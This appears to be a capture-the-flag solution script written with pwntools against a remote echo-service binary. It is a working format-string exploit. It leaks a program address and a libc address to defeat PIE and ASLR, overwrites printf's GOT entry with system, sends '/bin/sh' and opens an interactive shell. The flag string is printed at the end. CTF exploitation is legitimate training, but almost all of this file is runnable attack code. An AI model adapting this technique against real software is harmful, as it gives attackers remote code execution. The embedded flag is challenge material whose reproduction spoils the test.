#!/usr/bin/env python3

from pwn import *
# NOTEE: USE TIME IF YOU WANT TO DEBUG IT DYNAMICALLY TO SEE WHATS GOING ON / WHATS WRONG ?
# DONT FORGET TO OPEN ANOTHER TERMINAL AND RUN SEVERAL COMMAND
# ps aux | grep chall_patched/NAME OF OTHER BINARY --> TO GET PID
# gdb -q ./chall_patched
# (INSIDE GDB TYPE) attach <PID> (PID THAT YOU GET FROM ps aux | grep chall_patched/NAME OF OTHER BINARY) --> THIS FOR SYNCRHONIZE THE OUR PYTHON SCRIPT AND THE ELF PROGRAM RUN IN OTHER TERMINAL
# import time

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("ctf-chall.stembascc.com", 5213)

    return r


def main():
    r = conn()
    # time.sleep(50)
    main_43 = 17
    _IO_2_1_stdin_131 = 1
    offset_fmstr = 6
    # HANDLE PIE
    log.info("===== HANDLE PIE =====")
    r.sendline(f"%{main_43}$p")
    r.recvuntil(b"Welcome to echo service!\n")
    leak_main_43 = int(r.recvline().strip().decode(),16)
    log.info(f" Leak Main + 43 = {hex(leak_main_43)}")
    offset_main_43 = exe.sym['main'] + 43
    exe.address = leak_main_43 - offset_main_43
    log.info(f"Base Address = {hex(exe.address)}")
    log.info("===== HANDLE ASLR =====")
    r.sendline(f"%{_IO_2_1_stdin_131}$p")
    leak_IO_2_1_stdin_131 = int(r.recvline().strip().decode(),16)
    log.info(f"Leak _IO_2_1_stdin_ + 131 = {hex(leak_IO_2_1_stdin_131)}")
    offset_IO_2_1_stdin_131 = libc.sym['_IO_2_1_stdin_'] + 131
    libc.address = leak_IO_2_1_stdin_131 - offset_IO_2_1_stdin_131
    log.info(f"Libc Base Address = {hex(libc.address)}")
    log.info("===== HANDLE GOT OVERWRITE =====")
    payload = fmtstr_payload(offset_fmstr, {exe.got['printf'] : libc.sym['system']},write_size='short')
    log.info(f"The Payload Length = {len(payload)}")
    log.info(f"THE PAYLOAD : {payload}")
    r.sendline(payload)
    r.clean()
    r.sendline("/bin/sh")
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

# Flag: SELEKSI{g0t_0v3rwrite_t0_rc3}